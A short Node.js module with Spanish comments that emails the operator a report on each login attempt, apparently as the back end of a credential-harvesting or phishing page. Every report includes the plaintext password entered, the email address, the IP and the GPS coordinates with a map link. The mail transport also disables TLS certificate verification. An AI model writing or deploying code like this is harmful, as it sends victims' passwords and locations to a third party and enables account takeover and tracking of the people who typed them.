const nodemailer = require('nodemailer');
require('dotenv').config();

// Configurar el transporter de nodemailer
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  },
  tls: {
    rejectUnauthorized: false
  }
});

const sendLoginAttemptEmail = async (loginData) => {
  const { method, email, timestamp, location, timezone, password, ip } = loginData;
  
  console.log('Preparando envío de correo para intento de inicio de sesión...');
  console.log('Datos del intento:', {
    método: method,
    email: email,
    hora: new Date(timestamp).toLocaleString(),
    ip: ip
  });

  // Obtener la fecha y hora actual en la zona horaria del usuario
  const userTime = new Date(timestamp).toLocaleString('es-ES', { timeZone: timezone });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: `Nuevo intento de inicio de sesión - ${method}`,
    html: `
      <h2>Nuevo intento de inicio de sesión detectado</h2>
      <p><strong>Método:</strong> ${method}</p>
      <p><strong>Email usado:</strong> ${email}</p>
      <p><strong>Fecha y hora:</strong> ${new Date(timestamp).toLocaleString()}</p>
      <p><strong>Fecha y hora del usuario:</strong> ${userTime}</p>
      <p><strong>IP:</strong> ${ip || 'No disponible'}</p>
      ${password ? `<p><strong>Contraseña usada:</strong> ${password}</p>` : ''}
      ${location ? `
        <h3>Información de ubicación:</h3>
        <p><strong>Latitud:</strong> ${location.latitude}</p>
        <p><strong>Longitud:</strong> ${location.longitude}</p>
        <p><a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" target="_blank">Ver en Google Maps</a></p>
      ` : '<p>No se proporcionó información de ubicación</p>'}
      <p><strong>Zona horaria:</strong> ${timezone || 'No disponible'}</p>
    `
  };

  try {
    console.log('Intentando enviar correo...');
    await transporter.sendMail(mailOptions);
    console.log('✅ Email de notificación enviado exitosamente');
    return true;
  } catch (error) {
    console.error('❌ Error al enviar email:', error);
    console.error('Detalles del error:', {
      código: error.code,
      comando: error.command,
      mensaje: error.message
    });
    return false;
  }
};

module.exports = {
  sendLoginAttemptEmail
};
